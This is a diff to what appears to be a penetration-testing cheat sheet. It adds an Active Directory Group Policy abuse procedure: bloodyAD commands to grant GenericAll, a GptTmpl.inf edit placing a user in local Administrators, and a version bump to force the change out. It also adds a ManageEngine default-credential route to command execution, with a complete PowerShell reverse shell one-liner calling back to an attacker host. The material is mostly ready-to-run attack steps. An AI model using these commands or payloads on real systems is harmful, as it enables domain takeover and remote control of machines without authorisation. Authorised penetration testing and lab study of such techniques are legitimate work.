@@ -205,6 +205,36 @@ Use this for interacting with AD objects from Kali without requiring a full Wind
   ```bash
   bloodyAD -u [USER] -p [PASS] -d [DOMAIN] --host 10.10.10.10 set password 'CN=target_user,CN=Users,DC=domain,DC=local' 'NewPassword123!'
   ```
+
+### Group Policy (GPO) Abuse
+Requires `WriteOwner` or `GenericAll` over a GPO object.
+
+- **1. Grant Rights via bloodyAD (from Kali)**:
+  ```bash
+  bloodyAD -d [DOMAIN] -u [USER] -p [PASS] --host [DC_IP] add genericAll "CN={GPO_GUID},CN=Policies,CN=System,DC=domain,DC=local" [USER]
+  ```
+
+- **2. Inject Admin Group (SecEdit Template)**:
+  Navigate to the GPO folder in `SYSVOL`: `\\domain\SYSVOL\domain\Policies\{GPO_GUID}\Machine\Microsoft\Windows NT\SecEdit\`
+  Create or modify `GptTmpl.inf`:
+  ```ini
+  [Unicode]
+  Unicode=yes
+  [Group Membership]
+  *S-1-5-32-544__Members = [TARGET_USER]
+  [Version]
+  signature="$CHICAGO$"
+  Revision=1
+  ```
+
+- **3. Bump GPO Version**:
+  Modify `GPT.INI` in the root of the GPO folder:
+  ```powershell
+  (Get-Content GPT.INI) -replace 'Version=\d+', 'Version=99999' | Set-Content GPT.INI
+  ```
+
+- **4. Trigger Update**:
+  `gpupdate /force` on any domain machine to apply the group membership.
 - **RPC Password Reset (ForceChangePassword Rights):**
   - `net rpc password [TARGET_USER] [NEW_PASS] -U [DOMAIN]/[MY_USER]%[MY_PASS] -S [DC_IP]`
 
@@ -467,6 +497,15 @@ Use these when you have a shell but no tools (like BloodHound/Netexec) uploaded 
   - 2. Upload shell as `shell.php16`. The server will now execute it as PHP.
 - **Client-Side Bypass**: Use Burp to intercept and change extension/MIME type.
 - **Double Extension**: `shell.php.jpg` or `shell.php.png`
+
+### Application Specific RCE
+- **ManageEngine Applications Manager (Port 8443)**:
+  - *Identify*: ManageEngine Applications Manager login served on port 8443. Default `admin:admin`.
+  - *Method*: **Admin** -> **Actions** -> **Execute Program**.
+  - *Reverse Shell Payload (PowerShell)*:
+    ```powershell
+    powershell -c "$c=New-Object Net.Sockets.TCPClient('[KALI_IP]',[PORT]);$s=$c.GetStream();$b=New-Object Byte[] 65536;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
+    ```
 
 ### WordPress
 - **Scan Users & Plugins:**
